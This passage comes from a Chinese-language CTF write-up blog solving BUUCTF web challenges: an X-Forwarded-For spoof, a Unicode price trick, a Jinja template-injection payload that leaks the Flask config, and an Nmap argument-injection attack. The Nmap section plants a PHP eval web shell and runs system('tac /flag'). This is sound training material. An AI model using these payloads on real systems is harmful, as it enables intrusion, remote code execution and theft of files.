<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET /flag.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: node4.buuoj.cn:<span class="number">27478</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">109.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">117.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://node4.buuoj.cn:27478/</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br></pre></td></tr></table></figure>

<p>带了Referer，“我已经把购买者的IP保存了”，猜测可能是xff</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET /flag.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: node4.buuoj.cn:<span class="number">27478</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">109.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">117.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://node4.buuoj.cn:27478/</span></span><br><span class="line"><span class="comment">X-Forwarded-For: 127.0.0.1</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// XFF漏洞</span></span><br><span class="line">X-Forwarded-For: <span class="number">127.0</span>.<span class="number">0.1</span></span><br></pre></td></tr></table></figure>

<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><h2 id="原始信息-16"><a href="#原始信息-16" class="headerlink" title="原始信息"></a>原始信息</h2><p>首先得到一个买独角兽的页面，页面的内容是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Item ID 	Price 	English 	Spanish 	German 	Russian</span><br><span class="line">1 	2.0 	black and white unicorn 	unicornio blanco y negro 	Schwarzweiss-Einhorn 	черно-белый единорог</span><br><span class="line">2 	5.0 	unicorn family 	familia unicornio 	Einhorn-Familie 	семья единорога</span><br><span class="line">3 	8.0 	warrior unicorn 	guerrero unicornio 	Krieger Einhorn 	воин единорог</span><br><span class="line">4 	1337.0 	ultra unicorn 	ultra unicornio 	ultra Einhorn 	ультра единорог</span><br><span class="line"></span><br><span class="line">Purchase Unicorn</span><br><span class="line">Item ID			Price			购买按钮</span><br><span class="line">Item ID			Price			=&gt;上面的这个东西就是需要购买的，点击购买按钮购买</span><br></pre></td></tr></table></figure>





<h2 id="解题-16"><a href="#解题-16" class="headerlink" title="解题"></a>解题</h2><p>做了下基本的测试，尝试以原来的单价购买，会传来这样的东西:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">尝试购买前三个商品：</span><br><span class="line">Item ID=1			Price=3		=&gt;Wrong commodity!（发错货了！）操作失败。</span><br><span class="line">Item ID=2			Price=6		=&gt;Wrong commodity!（发错货了！）操作失败。</span><br><span class="line">Item ID=3			Price=9		=&gt;Wrong commodity!（发错货了！）操作失败。</span><br><span class="line">尝试第4个</span><br><span class="line">Item ID=4			Price=9		=&gt;You don&#x27;t have enough money!操作失败。</span><br><span class="line">Item ID=4			Price=91	=&gt;Only one char(?) allowed!(单引号双引号都是如此，猜测可能是py的长度检测)</span><br><span class="line"></span><br><span class="line">查看报错信息：</span><br><span class="line">Item ID=4			Price=</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/usr/local/lib/python2.7/site-packages/tornado/web.py&quot;, line 1541, in _execute</span><br><span class="line">    result = method(*self.path_args, **self.path_kwargs)</span><br><span class="line">  File &quot;/app/sshop/views/Shop.py&quot;, line 34, in post</span><br><span class="line">    unicodedata.numeric(price)</span><br><span class="line">TypeError: need a single Unicode character as parameter</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h1><h2 id="原始信息-17"><a href="#原始信息-17" class="headerlink" title="原始信息"></a>原始信息</h2><p>开头即碰到源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>这种情况分三种：</p>
<ol>
<li>nc连接该站点</li>
<li>python逆向</li>
<li>框架漏洞</li>
</ol>
<h2 id="解题-17"><a href="#解题-17" class="headerlink" title="解题"></a>解题</h2><p>先分析源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建flask实例</span></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将环境变量中的FLAG值赋值给flask当中的FLAG</span></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根路由</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="comment"># 主页面</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># 打开文件并且读取输出</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>得到一个特殊的路由</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/shrine/&lt;path:shrine&gt;</span><br></pre></td></tr></table></figure>

<p>尝试对路由进行模板注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get:http:<span class="comment">//xxx.xxxx.com:80/shrine/&#123;&#123;8*9&#125;&#125;</span></span><br><span class="line"><span class="keyword">return</span>: <span class="number">72</span></span><br></pre></td></tr></table></figure>

<p>注入点有了，根据代码分析来看，有限制条件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>括号替换为空</span><br><span class="line"><span class="number">2.</span><span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br></pre></td></tr></table></figure>

<p>现在，使用非括号的方式获取flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//xxx.xxx.xxx:81/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>这题的大佬参照<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425">点我</a></p>
<h1 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h1><h2 id="原始信息-18"><a href="#原始信息-18" class="headerlink" title="原始信息"></a>原始信息</h2><p>原始信息如下：</p>
<p>index页面：flag is in /flag</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>NMAP‍<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;css/bootstrap.css&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/jquery.js&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">		<span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">&quot;img/bg.png&quot;</span>) no-repeat;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">background-size</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">	</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color:#48e5ff;&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>NMAP‍<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">p</span>&gt;</span>Enter host or IP address to scan: <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;scanform&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-inline&quot;</span> <span class="attr">action</span>=<span class="string">&quot;?&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;host&quot;</span> <span class="attr">class</span>=<span class="string">&quot;input-large&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;hostname / IP&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="tag">				<span class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>Scan<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;waiter&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/list.php&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-inverse&quot;</span>&gt;</span>View existing results<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">		$(<span class="string">&#x27;#scanform&#x27;</span>).<span class="title function_">submit</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">			$(<span class="string">&#x27;#waiter&#x27;</span>).<span class="title function_">append</span>(<span class="string">&quot;&lt;b&gt;please, wait&lt;/b&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">		&#125;);</span></span><br><span class="line"><span class="language-javascript">	</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- flag is in /flag --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>list页面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;css/bootstrap.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-inverse&quot;</span>&gt;</span>to index<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> &gt;</span>Scan results:<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">&quot;table&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>File<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>Creation date<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>result展示页面：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>scan results: 117.21.200.166<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;css/bootstrap.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-inverse&quot;</span>&gt;</span>to index<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/list.php&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-inverse&quot;</span>&gt;</span>to list<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>Scan results for: 117.21.200.166<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;well&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>IP<span class="tag">&lt;/<span class="name">b</span>&gt;</span>: 117.21.200.166<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">									<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>Hostname<span class="tag">&lt;/<span class="name">b</span>&gt;</span>: 430e1588-a55a-4c29-8718-3e60d6dfc5e6.node4.buuoj.cn <span class="tag">&lt;<span class="name">em</span>&gt;</span>(user)<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">						</span><br><span class="line">									</span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">				</span><br><span class="line">						<span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">p</span>&gt;</span>Nmap done at Sat Sep  9 13:53:00 2023; 1 IP address (1 host up) scanned in 2.15 seconds<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="解题-18"><a href="#解题-18" class="headerlink" title="解题"></a>解题</h2><p>考点</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">选项 解释</span><br><span class="line">-oN 标准保存</span><br><span class="line">-oX XML保存</span><br><span class="line">-oG Grep保存</span><br><span class="line">-oA 保存到所有格式</span><br><span class="line">-append-output 补充保存文件</span><br><span class="line">选项-oG 将结果Grep保存。</span><br></pre></td></tr></table></figure>



<p>这是一道nmap考察题，考察对nmap的使用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 测试的重点：尝试插入木马，读取文件信息</span></span><br><span class="line"><span class="comment"># 测试的时候会经常出现远程主机不存在或者被关闭</span></span><br><span class="line"><span class="comment"># 这种情况，着重的看文件是否存在即可（url访问）</span></span><br><span class="line"></span><br><span class="line">input: </span><br><span class="line">	POST:host= 127.0.0.1<span class="string">&#x27; -F --oN aa.txt&#x27;</span></span><br><span class="line">访问：/aa.txt</span><br><span class="line">	<span class="comment"># Nmap 6.47 扫描于 2023 年 9 月 10 日星期日启动，如下： nmap -Pn -T4 -F --host-timeout 1000ms -oX xml/90504 -oN aa.txt 127.0.0.1\ \\</span></span><br><span class="line">    无法解析“127.0.0.1\”。</span><br><span class="line">    无法解析“\\”。</span><br><span class="line">    警告：未指定目标，因此扫描了 0 个主机。</span><br><span class="line">    <span class="comment"># Nmap 于 2023 年 9 月 10 日星期日 02:13:32 完成 - 0.37 秒内扫描了 0 个 IP 地址（0 个主机已启动）</span></span><br><span class="line"></span><br><span class="line">能正常执行，可以尝试写入木马：</span><br><span class="line">input:</span><br><span class="line">	POST:host= 127.0.0.1<span class="string">&#x27; -oN b.phtml &lt;?=eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">访问：</span><br><span class="line">	get: http://ba6872a0-16bb-4fbe-a42f-d4fbef0ce4ba.node4.buuoj.cn:81/b.phtml</span><br><span class="line">	post:1=system(<span class="string">&#x27;tac /flag&#x27;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># Nmap 6.47 scan initiated Sun Sep 10 02:44:19 2023 as: nmap -Pn -T4 -F --host-timeout 1000ms -oX xml/f8dd1 -oN b.phtml  127.0.0.1\ flag&#123;cc706b09-7c43-4b5f-895f-c6c9014d26e4&#125;</span></span><br><span class="line">    \\</span><br><span class="line">    Failed to resolve <span class="string">&quot; 127.0.0.1\&quot;.</span></span><br><span class="line"><span class="string">    Failed to resolve &quot;</span>flag&#123;cc706b09-7c43-4b5f-895f-c6c9014d26e4&#125;</span><br><span class="line">    \\&quot;.</span><br><span class="line">    WARNING: No targets were specified, so 0 hosts scanned.</span><br><span class="line">    <span class="comment"># Nmap done at Sun Sep 10 02:44:19 2023 -- 0 IP addresses (0 hosts up) scanned in 0.17 seconds</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">除了插入木马，还有nmap一步到位的读取：</span><br><span class="line">input:</span><br><span class="line">	 post: 127.0.0.1<span class="string">&#x27; -iL /flag -oN vege.txt &#x27;</span></span><br></pre></td></tr></table></figure>

<p>参考WP：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43801002/article/details/107746582">点我</a></p>
<p>参考NMAP介绍：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/585377081">点我</a></p>
<p>相对正确的nmap中文翻译参照：<a target="_blank" rel="noopener" href="https://blog.csdn.net/smli_ng/article/details/105964486">点我</a></p>
<h1 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h1><h2 id="原始信息-19"><a href="#原始信息-19" class="headerlink" title="原始信息"></a>原始信息</h2><p>原始信息其实就一个页面，很多人说底部有个链接可以点击，但是我可没有看到。</p>
<p>测试的时候是在BP当中看到的模板漏洞。</p>
<p>页面hackbar工具做不到这点，因为它会转义为url再发送信息。</p>
<p>下面是index页面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>A Simple IP Address API<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./css/bootstrap.min.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;float:left;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>IP<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;hidden-xs hidden-sm&quot;</span>&gt;</span>A Simple Public IP Address API<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;float:right;margin-top:30px;&quot;</span>&gt;</span>Current IP:10.244.80.12		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;why row&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-xs-12&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Why use?<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span 